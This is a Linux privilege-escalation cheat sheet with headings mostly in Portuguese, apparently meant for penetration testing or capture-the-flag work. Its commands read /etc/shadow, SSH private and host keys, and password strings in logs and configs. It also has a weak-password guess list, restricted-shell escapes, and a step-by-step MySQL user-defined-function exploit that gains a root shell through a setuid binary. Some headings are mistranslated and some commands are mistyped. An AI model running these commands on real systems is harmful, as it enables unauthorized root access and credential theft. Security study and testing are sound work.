# Escalação de privilégios do Linux

## Gerando shell/quebrando shell restrito

```text
python -c 'import pty; pty.spawn("/bin/sh")'

/bin/sh -i

echo os.system('/bin/bash')

(From within vi)
:!bash
```

### Adicione todos os caminhos binários se a variável PATH estiver faltando

```text
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Configurar servidor web

```text
$ python -m SimpleHTTPServer 8080

$ php -S 0.0.0.0:80
```

## Informações básicas do sistema

```text
$ uname -a
$ cat /etc/*release
$ cat /proc/version
$ cat /etc/issue
```

### Variáveis ​​de ambiente

```text
$ cat /etc/profile
$ cat/etc/bashrc
$ cat  $HOME/.bash_profile
$ cat $HOME/.bashrc
$ env
$ set *
$ export *
```

### Usuários

```text
Current user:
$ id

Outros usuários:
$ who
$ w
$ last
$ cat /etc/passwd
$ cat /etc/group
$ cat /etc/shadow

Encontre arquivos com permissões de grupo específicas:
$ find / -type d -group groupname -perm -g=r -print 2>/dev/null

Usuários com login:
$ grep -vE "nologin" /etc/passwd

Verifique os diretórios iniciais dos usuários:
$ ls -ahlR /root/
$ ls -ahlR /home/

Histórico do usuário:
$ cat $HOME/.bash_history
$ find -name ".bash_history" -exec cat {} \;
```

### Programas em execução

```text
$ ps -aux
$ ps -ef

Programas root:
$ ps -aux | grep root
```

### Explorações do kernel

```text
$ searchsploit Linux Kernel <version>
check privilege escalation script outputs
```

### Locais de software instalado

```text
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

Debian:
$ dpkg -l

CentOS, OpenSuse, Fedora, RHEL:
$ rpm -qa

OpenBSD, FreeBSD:
$ pkg_info
```

### Explorações do kernel

```text
Check database config-files for webapps
Check databases
Check for weak passwords
username:username
username:username1
username:root
username:admin
username:qwerty
username:password

Procure arquivos de log contendo pwd ou senha:
$ find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password'

Search configuration files containing pwd or password:
$ find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null
```

### Arquivos

```text
Encontre pastas graváveis ​​em todo o mundo:
$ find / -perm -0002 -type d 2>/dev/null

Encontre pastas graváveis ​​para o usuário atual
$ find / -path /proc -prune -o -writable 2>/dev/null


Encontre arquivos graváveis ​​em todo o mundo - exclua proc:
$ find / -path /proc -prune -o -perm -0002 -type f 2>/dev/null

Arquivos ocultos ou perdidos em diretórios da web:
$ ls -alhR /var/www/
$ ls -alhR /var/www/html/
$ ls -alhR /srv/www/htdocs/
$ ls -alhR /usr/local/www/apache22/data/
$ ls -alhR /opt/lampp/htdocs/

Registros da Web:
$ cat /etc/httpd/logs/access_log
$ cat /etc/httpd/logs/access.log
$ cat /etc/httpd/logs/error_log
$ cat /etc/httpd/logs/error.log
$ cat /var/log/apache2/access_log
$ cat /var/log/apache2/access.log
$ cat /var/log/apache2/error_log
$ cat /var/log/apache2/error.log
$ cat /var/log/apache/access_log
$ cat /var/log/apache/access.log
$ cat /var/log/auth.log
$ cat /var/log/chttp.log
$ cat /var/log/cups/error_log
$ cat /var/log/dpkg.log
$ cat /var/log/faillog
$ cat /var/log/httpd/access_log
$ cat /var/log/httpd/access.log
$ cat /var/log/httpd/error_log
$ cat /var/log/httpd/error.log
$ cat /var/log/lastlog
$ cat /var/log/lighttpd/access.log
$ cat /var/log/lighttpd/error.log
$ cat /var/log/lighttpd/lighttpd.access.log
$ cat /var/log/lighttpd/lighttpd.error.log
$ cat /var/log/messages
$ cat /var/log/secure
$ cat /var/log/syslog
$ cat /var/log/wtmp
$ cat /var/log/xferlog
$ cat /var/log/yum.log
$ cat /var/run/utmp
$ cat /var/webmin/miniserv.log
$ cat /var/www/logs/access_log
$ cat /var/www/logs/access.log
$ ls -alh /var/lib/dhcp3/
$ ls -alh /var/log/postgresql/
$ ls -alh /var/log/proftpd/
$ ls -alh /var/log/samba/
```

### Verifique se há serviços internos não disponíveis remotamente

```text
$ cat /etc/services
$ netstat -anlp
$ netstat -ano
$ lsof -i TCP -n -P
$ lsof -i UDP -n -P
```

### Definições de configuração de rede

```text
$ cat /etc/resolv.conf
$ cat /etc/networks
$ cat /etc/hosts

Verifique as configurações do firewall:
$ iptables -L 
$ ufw status

$ arp -e
$ route
$ netstat -r
```

### Configuração incorreta do Suid

```text
Example programs, also check for file editors/viewers:
nmap
vim
Nano
Less
More
Man 

Find suid/guid files:
$ find / -perm -u=s -type f 2>/dev/null
$ find / -perm -g=s -type f 2>/dev/null

Find sticky bits - only the owner of the directory or file can delete or rename here:
$ find / -perm -1000 -type d 2>/dev/null

List commands current user can run sudo for
$ sudo -l

$ cat /etc/sudoers
```

### Sistemas de arquivos desmontados

```text
Look for unmounted filesystems. If found, try to mount and enumerate
$ mount -l
$ cat /etc/vfstab
$ cat /etc/fstab
```

### Cronjob

```text
Look for anything that is owned by privileged user but writable for you

If cronjob runs scripts look for wildcard options being used and attempt command option injection with filenames https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

crontab -l
$ ls -alh /var/spool/cron
$ ls -al /etc/ | grep cron
$ ls -al /etc/cron*
$ cat /etc/cron*
$ cat /etc/at.allow
$ cat /etc/at.deny
$ cat /etc/cron.allow
$ cat /etc/cron.deny
$ cat /etc/crontab
$ cat /etc/anacrontab
$ cat /var/spool/cron/crontabs/root
```

### Chaves SSH 

```text
Check all home directories:

cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### Configuração PATH incorreta

```text
check PATH variable for a .
```

## MySQL

```text
If root access on MySQL then create a user defined function to escalate to root shell
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
https://www.exploit-db.com/exploits/1518/

Steps:
copy 1518.so over or lib_mysqludf_sys.so over to target
(located on kali under sqlmap directory)
/usr/share/sqlmap/udf/mysql/linux/32/lib_mysqludf_sys.so_
/usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so_

mysql -u root
use mysql;
create table hack(line blob);
insert into hack values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from hack into dumpfile '/usr/lib/lib_mysqludf_sys.so';
create function sys_exec returns some integer soname'lib_mysqludf_sys.so';

Test function:
select sys_exec('id >/tmp/out; chown user:user /tmp/out');
quit
cat /tmp/out

Use function to run a setuid program:
select sys_exec('chmod + s /tmp/setuid');
/tmp/setuid
```

### Get user hashes from MySQL

```text
strings /var/lib/mysql/mysql/user.MYD
```

### Debian MySQL

```text
debian-sys-maint has access to the database and can be used to dump information from the database
Password is located in /etc/mysql/debian.cnf
```

## Exploração Binária

```text
$ strings FILENAME

$ strace FILENAME

$ ltrace FILENAME

look for seg faults
```

Determine if NX is on

```text
C:\> wmic OS Get DataExecutionPrevention_Available

C:\> coreinfo.exe | find "NX" (coreinfo.exe from Sysinternals Suite)

$ grep ^flags /proc/cpuinfo | head -n1 | egrep --color=auto ' (pae|nx) '
```

Verifique se há ASLR

```text
$ cat /proc/sys/kernel/randomize_va_space

With binary (run multiple times and see if address changes)

$ ldd overflow | grep libc
```
